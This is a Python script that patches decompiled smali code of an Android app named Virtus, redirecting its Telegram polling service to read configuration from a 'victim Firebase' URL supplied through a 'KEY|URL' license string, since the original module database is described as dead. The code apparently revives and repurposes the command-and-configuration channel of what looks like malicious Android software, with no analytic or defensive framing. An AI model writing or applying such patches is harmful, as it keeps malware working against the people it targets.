#!/usr/bin/env python3
"""Patch Virtus APK to read config from victim Firebase (module DB is often dead)."""

from pathlib import Path

ROOT = Path("/workspace/apk/virtus_decompiled/smali/com/virtus/module")
TGS = ROOT / "TelegramPollingService.smali"
MAIN = ROOT / "MainActivity.smali"
MODULE_DB = "https://virtus-module-default-rtdb.firebaseio.com"


def patch_read_config() -> None:
    text = TGS.read_text()

    old = f"""    .line 467
    :try_start_0
    new-instance v4, Ljava/net/URL;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {{v5}}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "{MODULE_DB}/config/"

    invoke-virtual {{v5, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {{p1}}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {{v5, p1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ".json"

    invoke-virtual {{v5, p1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {{v5}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {{v4, p1}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V"""

    new = f"""    .line 467
    :try_start_0
    const-string v2, "virtus_module_prefs"

    const/4 v4, 0x0

    invoke-virtual {{p0, v2, v4}}, Lcom/virtus/module/TelegramPollingService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    const-string v4, "firebase_poll_url"

    const-string v5, ""

    invoke-interface {{v2, v4, v5}}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {{v2}}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {{p1}}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    new-instance v4, Ljava/net/URL;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {{v5}}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {{v2}}, Ljava/lang/String;->isEmpty()Z

    move-result v6

    if-eqz v6, :virtus_use_module_db

    invoke-virtual {{v5, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "/config/"

    invoke-virtual {{v5, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {{v5, p1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ".json"

    invoke-virtual {{v5, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :virtus_cfg_url

    :virtus_use_module_db
    const-string v1, "{MODULE_DB}/config/"

    invoke-virtual {{v5, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {{v5, p1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ".json"

    invoke-virtual {{v5, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :virtus_cfg_url
    invoke-virtual {{v5}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {{v4, p1}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V"""

    if old not in text:
        # Already patched or Astik block differs — try alternate (pre-trim key) block
        alt_old = old.replace(
            "invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;\n\n    move-result-object p1\n\n    invoke-virtual {v5, p1}",
            "invoke-virtual {v5, p1}",
        )
        if alt_old in text:
            text = text.replace(alt_old, new, 1)
            TGS.write_text(text)
            print("readConfig victim-firebase fallback patched (alt block)")
            return
        raise SystemExit("readConfig URL block not found — patch_astik_flow may need to run first")

    text = text.replace(old, new, 1)
    TGS.write_text(text)
    print("readConfig victim-firebase fallback patched")


def patch_run_test_key_url() -> None:
    text = MAIN.read_text()
    old = """    .line 290
    :cond_0
    iget-object v1, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "license_key"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V"""
    new = """    .line 290
    :cond_0
    const-string v1, "|"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :virtus_save_plain_key

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    aget-object v0, v1, v2

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x1

    aget-object v1, v1, v2

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "firebase_poll_url"

    invoke-interface {v2, v3, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    :virtus_save_plain_key
    iget-object v1, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "license_key"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V"""
    if old not in text:
        print("runTest KEY|URL patch already applied (skip)")
        return
    MAIN.write_text(text.replace(old, new, 1))
    print("runTest KEY|URL parser patched")


def main() -> None:
    patch_read_config()
    patch_run_test_key_url()


if __name__ == "__main__":
    main()
